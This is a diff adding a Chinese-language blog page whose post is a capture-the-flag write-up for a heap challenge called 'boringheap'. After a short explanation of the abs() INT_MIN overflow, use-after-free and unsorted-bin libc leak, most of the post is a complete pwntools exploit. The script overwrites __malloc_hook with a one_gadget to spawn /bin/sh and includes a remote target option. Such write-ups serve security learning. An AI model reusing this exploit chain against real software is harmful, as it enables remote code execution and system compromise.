@@ -1,0 +1,307 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>My awesome title - gravity的个人博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="GraVity0,"> 
+    <meta name="description" content="boringheap首先把做这道题必须要知道abs的负数溢出：简单介绍一下： 
+#include &amp;lt;stdlib.h&amp;gt; //或math.h
+int abs( int num );
+
+这里,"> 
+    <meta name="author" content="yuntao you"> 
+    <link rel="alternative" href="atom.xml" title="gravity的个人博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/first.jpg"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">gravity的个人博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">My awesome title</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">My awesome title</h1>
+        <div class="stuff">
+            <span>十月 13, 2016</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/标签1/">标签1</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/标签2/">标签2</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>boringheap<br>首先把做这道题必须要知道abs的负数溢出：<br>简单介绍一下： </p>
+<pre><code class="cpp">#include &lt;stdlib.h&gt; //或math.h
+int abs( int num );
+</code></pre>
+<p>这里的这个int返回值形式，就很有意思：    </p>
+<ul>
+<li>如果num为0或者是正数时，函数返回num值。   </li>
+<li>当num为负数且不是最小负数（0x80000000/-2147483648）时，函数返回num的对应绝对值数，即将内存中该二进制位的符号位取反，并把后面数值位取反加一。  </li>
+<li>当num为最小的负数时，因为int类型32位表示不了这个数的绝对值，所以依然返回该函数。    </li>
+</ul>
+<p>接下来是泄露libc基址部分：  </p>
+<pre><code class="cpp">create(2,&quot;1&quot;)
+create(2,&quot;2&quot;)
+create(2,&quot;3&quot;)
+r.recvuntil(&#39;5.Exit&#39;)
+r.sendline(&#39;1&#39;)
+r.recvuntil(&quot;3.Large&quot;)
+r.sendline(str(2))
+r.recvuntil(&#39;Input Content:&#39;)
+r.send(p64(0)+p64(0x31)+p64(0)*3+p64(0x21))
+#debug()
+create(3,p64(0)+p64(0x31))
+create(3,p64(0)+p64(0x41))
+create(3,&quot;1111&quot;)
+edit(1,-2147483648,&quot;\x00&quot;*0x18+p64(0x91))
+delete(1)
+create(2,&quot;aaaa&quot;)
+show(2)
+date = rud(&quot;5.Exit&quot;)
+log.info(&quot;puts&quot;,libc.symbols[&#39;puts&#39;])
+libc_base = u64(date[1:7]+&quot;\x00\x00&quot;)-0x3c4b78
+</code></pre>
+<p>由于题目规定了三个大小的chunk，所以我们要想得到unsorted bin就需要利用上面讲的abs漏洞来修改chunk的size，使其满足unsorted bin的要求。<br>这道题中，没有对free后的指针进行处理，所以有uaf漏洞。我们都知道如果申请的chunk的大小小于unsorted bin，那么就会将剩余的unsorted bin当作下一个unsorted bin，所以在这里将chunk1的size修改为0x91，free之后，申请一个medium大小的chunk，这样的话，chunk2就会成为unsorted bin，利用uaf就可以将main_arena泄露出来。   </p>
+<pre><code class="cpp">from pwn import *
+import sys
+context.log_level=&#39;debug&#39;
+local = 1
+
+
+if local:
+    r = process(&#39;./pwn&#39;)
+    libc = ELF(&#39;./libc.so&#39;)
+else:
+    r = remote(&#39;8sdafgh.gamectf.com&#39;,10001)
+    libc = ELF(&#39;./libc.so&#39;)
+
+&#39;&#39;&#39;
+0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+
+&#39;&#39;&#39;
+
+file = ELF(&#39;./pwn&#39;)
+
+rud = lambda x : r.recvuntil(x,drop=True)
+
+def debug():
+    gdb.attach(r)
+    raw_input()
+
+def create(choose,value):
+    r.recvuntil(&#39;5.Exit&#39;)
+    r.sendline(&#39;1&#39;)
+    r.recvuntil(&quot;3.Large&quot;)
+    r.sendline(str(choose))
+    r.recvuntil(&#39;Input Content:&#39;)
+    r.sendline(value)
+
+def delete(index):
+    r.recvuntil(&#39;5.Exit&#39;)
+    r.sendline(&#39;3&#39;)
+    r.recvuntil(&#39;Which one do you want to delete?&#39;)
+    r.sendline(str(index))
+
+def show(index):
+    r.recvuntil(&#39;5.Exit&#39;)
+    r.sendline(&#39;4&#39;)
+    r.recvuntil(&#39;Which one do you want to view?&#39;)
+    r.sendline(str(index))
+
+def edit(index,size,value):
+    r.recvuntil(&#39;5.Exit&#39;)
+    r.sendline(&#39;2&#39;)
+    r.recvuntil(&#39;Which one do you want to update?&#39;)
+    r.sendline(str(index))
+    r.recvuntil(&#39;Where you want to update?&#39;)
+    r.sendline(str(size))
+    r.recvuntil(&quot;Input Content:&quot;)
+    r.sendline(value)
+
+create(2,&quot;1&quot;)
+create(2,&quot;2&quot;)
+create(2,&quot;3&quot;)
+
+r.recvuntil(&#39;5.Exit&#39;)
+r.sendline(&#39;1&#39;)
+r.recvuntil(&quot;3.Large&quot;)
+r.sendline(str(2))
+r.recvuntil(&#39;Input Content:&#39;)
+r.send(p64(0)+p64(0x31)+p64(0)*3+p64(0x21))
+#debug()
+create(3,p64(0)+p64(0x31))
+create(3,p64(0)+p64(0x41))
+create(3,&quot;1111&quot;)
+edit(1,-2147483648,&quot;\x00&quot;*0x18+p64(0x91))
+delete(1)
+create(2,&quot;aaaa&quot;)
+show(2)
+date = rud(&quot;5.Exit&quot;)
+log.info(&quot;puts&quot;,libc.symbols[&#39;puts&#39;])
+libc_base = u64(date[1:7]+&quot;\x00\x00&quot;)-0x3c4b78
+log.info(&quot;libc_base&quot;,libc_base)
+#debug()
+r.sendline(&#39;1&#39;)
+r.recvuntil(&quot;3.Large&quot;)
+r.sendline(str(2))
+r.recvuntil(&#39;Input Content:&#39;)
+r.sendline(&quot;d&quot;)
+edit(2,-2147483648,&quot;\x00&quot;*0x18+p64(0xd1))
+__malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]
+delete(2)
+create(2,&quot;1111&quot;)
+create(2,&quot;1111&quot;)
+create(3,&quot;2222&quot;)
+create(1,&quot;1111&quot;)
+create(1,&quot;1111&quot;)
+delete(12)
+delete(4)
+edit(11,0,p64(libc_base+0x3c4b30+5-8))
+create(3,&quot;123&quot;)
+create(3,&quot;111&quot;+p64(libc_base+0x3c4b50)+p64(0)*2+p64(0x51)+p64(0))
+
+r.recvuntil(&#39;5.Exit&#39;)
+r.sendline(&#39;1&#39;)
+r.recvuntil(&quot;3.Large&quot;)
+r.sendline(str(3))
+r.recvuntil(&#39;Input Content:&#39;)
+r.send(p64(0)*3+p64(__malloc_hook-0x10)+p64(__malloc_hook-0x10)+p64(0x3c4b78+libc_base)+p64(0x3c4b78+libc_base)+p64(0x3c4b78+libc_base))
+#debug()
+create(3,p64(libc_base+0xf1147))
+r.recvuntil(&#39;5.Exit&#39;)
+r.sendline(&#39;1&#39;)
+r.recvuntil(&quot;3.Large&quot;)
+r.sendline(str(3))
+r.interactive()
+</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="http://domain.com/awesome.mp3">
+            </audio>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"lift","width":200,"height":350},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
